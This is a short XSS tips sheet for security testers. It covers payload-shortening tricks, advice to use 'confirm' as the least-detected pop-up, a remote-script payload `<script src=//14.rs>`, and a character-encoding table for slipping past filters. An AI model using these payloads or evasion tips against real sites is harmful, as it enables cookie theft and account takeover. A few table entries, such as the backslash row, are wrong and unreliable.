# XSS Tips

### Tips & Tricks

* `http(s)://` can be shortened to `//` or `/\\` or `\\`.
* `document.cookie` can be shortened to `cookie`. It applies to other DOM objects as well.
* alert and other pop-up functions don't need a value, so stop doing `alert('XSS')` and start doing `alert()`
* You can use `//` to close a tag instead of `>`.
* I have found that `confirm` is the least detected pop-up function so stop using `alert`.
* Quotes around attribute value aren't necessary as long as it doesn't contain spaces. You can use `<script src=//14.rs>` instead of `<script src="//14.rs">`
* The shortest HTML context XSS payload is `<script src=//14.rs>` \(19 chars\)

#### Awesome Encoding

| HTML | Char | Numeric | Description | Hex | CSS \(ISO\) | JS \(Octal\) | URL |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| `&quot;` | " | `&#34;` | quotation mark | u+0022 | \0022 | \42 | %22 |
| `&num;` | \# | `&#35;` | number sign | u+0023 | \0023 | \43 | %23 |
| `&dollar;` | $ | `&#36;` | dollar sign | u+0024 | \0024 | \44 | %24 |
| `&percnt;` | % | `&#37;` | percent sign | u+0025 | \0025 | \45 | %25 |
| `&amp;` | \`& | `&#38;` | ampersand | u+0026 | \0026 | \46 | %26 |
| `&apos;` | ' | `&#39;` | apostrophe | u+0027 | \0027 | \47 | %27 |
| `&lpar;` | \( | `&#40;` | left parenthesis | u+0028 | \0028 | \50 | %28 |
| `&rpar;` | \) | `&#41;` | right parenthesis | u+0029 | \0029 | \51 | %29 |
| `&ast;` | \* | `&#42;` | asterisk | u+002A | \002a | \52 | %2A |
| `&plus;` | + | `&#43;` | plus sign | u+002B | \002b | \53 | %2B |
| `&comma;` | , | `&#44;` | comma | u+002C | \002c | \54 | %2C |
| `&minus;` | - | `&#45;` | hyphen-minus | u+002D | \002d | \55 | %2D |
| `&period;` | . | `&#46;` | full stop; period | u+002E | \002e | \56 | %2E |
| `&sol;` | / | `&#47;` | solidus; slash | u+002F | \002f | \57 | %2F |
| `&colon;` | : | `&#58;` | colon | u+003A | \003a | \72 | %3A |
| `&semi;` | ;\` | `&#59;` | semicolon | u+003B | \003b | \73 | %3B |
| `&lt;` | &lt; | `&#60;` | less-than | u+003C | \003c | \74 | %3C |
| `&equals;` | = | `&#61;` | equals | u+003D | \003d | \75 | %3D |
| `&gt;` | &gt; | `&#62;` | greater-than sign | u+003E | \003e | \76 | %3E |
| `&quest;` | ? | `&#63;` | question mark | u+003F | \003f | \77 | %3F |
| `&commat;` | @ | `&#64;` | at sign; commercial at | u+0040 | \0040 | \100 | %40 |
| `&lsqb;` | \[ | `&#91;` | left square bracket | u+005B | \005b | \133 | %5B |
| `&bsol;` | / | `&#92;` | backslash | u+005C | \005c | \134 | %5C |
| `&rsqb;` | \] | `&#93;` | right square bracket | u+005D | \005d | \135 | %5D |
| `&Hat;` | ^ | `&#94;` | circumflex accent | u+005E | \005e | \136 | %5E |
| `&lowbar;` | \_ | `&#95;` | low line | u+005F | \005f | \137 | %5F |
| `&grave;` | \` | `&#96;` | grave accent | u+0060 | \0060 | \u0060 | %60 |
| `&lcub;` | { | `&#123;` | left curly bracket | u+007b | \007b | \173 | %7b |
| `&verbar;` | \| | `&#124;` | vertical bar | u+007c | \007c | \174 | %7c |
| `&rcub;` | } | `&#125;` | right curly bracket | u+007d | \007d | \175 | %7d |

